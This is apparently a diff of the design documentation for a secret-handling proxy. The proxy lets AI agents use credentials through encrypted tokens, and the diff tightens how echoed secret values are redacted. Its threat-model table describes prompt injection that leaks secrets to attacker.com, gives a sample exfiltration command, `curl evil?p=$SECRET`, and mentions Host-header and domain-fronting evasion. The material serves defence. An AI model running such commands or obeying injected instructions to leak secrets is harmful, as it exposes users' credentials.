@@ -19,7 +19,7 @@ model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(
 | Prompt injection sends the secret to attacker.com | Allowed hosts are sealed inside the token; wrong host → HTTP 403 |
 | Request to attacker.com with `Host: allowed.example` (or domain fronting through a CDN) | Policy uses the address the proxy really connects to; a Host header naming another host is refused |
 | Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args (no args starting with `-`); the value goes in by env or stdin, never on a command line |
-| Site echoes the value back | Proxy / ops redact every resolved value in responses and command output |
+| Site or command echoes the value back (whole, cut, split, re-cased, base64, hex, escaped) | One redactor (`redact.py`) on every exit to the model: every encoding of the whole value, any case, and every run of 4+ characters of it, so no more than 3 consecutive characters of a value survive; what cannot be redacted (body over 4 MiB, undecodable content-encoding, redactor error) is withheld, never passed through (`tests/test_no_reconstruct.py`) |
 | Token pasted into a tool that bypasses the gate | Site receives the literal ciphertext: login fails, nothing leaks |
 | Private key leaks | Install the gate service (`secret-gate system install`, below): keys belong to the role account `_agentswitchgate`, unreadable for the login user; without it, keep `~/.secret-gate/` deny-listed for agents |
 
@@ -380,8 +380,9 @@ An MCP stdio server that spawns another MCP server (the unmodified Playwright MC
   proxy, `http` use), and types the **real value** into the element. The model still only ever
   handles the token. Because the value is in the DOM, browser-side e-mail/length checks and JS
   hashing work.
-- Every text result is redacted with every value filled in the session, in every encoding a
-  browser produces (raw, `%xx`, `+`, JSON/JS-escaped, HTML entities). The `### Ran Playwright code`
+- Every text result is redacted with every value filled in the session by the shared redactor:
+  every encoding (raw, `%xx`, `+`, JSON/JS-escaped, HTML entities, hex, base64 at any offset), any
+  case, and any 4-character fragment; a result the redactor fails on is withheld. The `### Ran Playwright code`
   echo of a fill and Playwright's `- [Snapshot](...)` file links are dropped outright.
 - Never advertised: `browser_evaluate`, `browser_run_code_unsafe`.
 - Refused always: any `filename` argument (unredacted file), any `paths` argument (would upload
@@ -492,5 +493,15 @@ could impersonate it and receive the substituted secret.
 - Sites that hash the password in browser JS or validate the field format: the proxy cannot
   see a placeholder there. Use `secret_fill` (browser section above). WebSocket/gRPC logins and
   request signing outside the browser: a template under `secret_exec`.
-- Responses are redacted by exact value match; a site that returns a transformed value
-  (e.g. masked) is not detected, which is fine.
+- Responses are redacted by the redactor's rules (gate-simple-v0 §3.1): whole value in the listed
+  encodings, any case, and every 4-character fragment of the raw value. Fragments of an *encoded*
+  form are not matched (the encoding's untouched characters are raw fragments anyway); MIME-wrapped
+  base64, a value reversed or spaced out, or sent elsewhere by a program are deliberate
+  transformations and not detected. Harmless text sharing 4 characters with a value is
+  over-redacted. Values shorter than `MIN_REDACT_LENGTH` are not redacted.
+- Withheld rather than redacted (§3.2): proxy bodies, `secret_http` bodies and `secret_exec` output
+  over 4 MiB (`内容过大，已扣下`), bodies in an unknown or stacked content-encoding, bodies whose
+  bytes still hold a value in another charset, and anything the redactor fails on; a WebSocket
+  message from the server that cannot be redacted is dropped. In the proxy, the values a request
+  used are remembered per execution scope and host, so later responses of that session (a profile
+  page echoing the password) are redacted too.
